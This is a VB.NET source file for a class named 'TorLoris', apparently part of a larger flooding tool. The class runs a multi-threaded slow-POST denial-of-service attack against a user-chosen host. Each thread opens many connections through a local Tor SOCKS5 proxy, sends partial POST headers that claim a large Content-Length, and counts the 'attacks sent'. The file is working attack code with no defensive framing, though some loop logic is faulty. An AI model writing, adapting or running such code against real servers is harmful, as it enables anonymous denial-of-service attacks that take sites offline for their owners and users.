Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Imports Starksoft.Aspen.Proxy

Public Class TorLoris
    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private Port As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private RandomFile As Boolean
    Private proxyClient As Socks5ProxyClient
    Public Sub New(ByVal model As TorLorisModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.newBaseFloodModel.Host
            Port = model.newTorLorisVariables.Port
            PostDATA = model.newTorLorisVariables.PostDATA
            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
            TimetoAttack = model.newBaseFloodModel.Time
            RandomFile = model.newTorLorisVariables.RandomFile
            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(ThreadstoUse - 1) {}
            GetFloodsBase().Reset()
            GetFloodsBase().SetMessage("TorLoris attack started")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            GetFloodsBase().SetMessage("A TorLoris Attack is Already Running on " & HostToAttack)
        End If
    End Sub
    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            HostToAttack = ""
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetMessage("Torloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
            GetFloodsBase().SetEnd()
        End If

    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            GetFloodsBase().SetMessage("Torloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
            HostToAttack = ""

        Else
            GetFloodsBase().SetMessage("No Torloris Attack is Running!")
        End If
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim TCParray As TcpClient() = New TcpClient(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew

            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer

                    For i = 0 To 100 - 1
                        If RandomFile Then
                            file = GenerateRandomString(5, True)
                        End If
                        Dim headerContent = New StringBuilder()
                        headerContent.AppendLine("POST /" & file & " HTTP/1.1")
                        headerContent.AppendLine("Host: " & IPAddress.Loopback.ToString() & ":" & Config.Variables.ServerReachPort)
                        headerContent.AppendLine("Connection: keep-alive")
                        headerContent.AppendLine("Content-Length: 5235")
                        headerContent.AppendLine()

                        Dim headerString As String = headerContent.ToString
                        Dim header = Encoding.UTF8.GetBytes(headerString)
                        Dim headerLength As Integer = Encoding.UTF8.GetByteCount(headerString)

                        proxyClient = New Socks5ProxyClient(IPAddress.Loopback.ToString(), Config.Variables.SocketPort) With {
                            .ProxyUserName = "",
                            .ProxyPassword = ""
                        }
                        TCParray(i) = proxyClient.CreateConnection(HostToAttack, Port)

                        Using stream = TCParray(i).GetStream()
                            stream.Write(header, 0, headerLength)
                            stream.Flush()
                        End Using

                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * headerContent.Length)

                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        Dim bytes As Integer = 0
                        Dim sb = New StringBuilder()
                        Dim bytesReceived As Byte() = New Byte(255) {}

                        Dim reader = New StreamReader(TCParray(i).GetStream())
                        Dim msg As String = ""
                        While reader.Peek > -1
                            msg = msg + Convert.ToChar(reader.Read()).ToString
                        End While

                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                        TCParray(i).Close()

                    Next j
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        Ended()
    End Sub
End Class
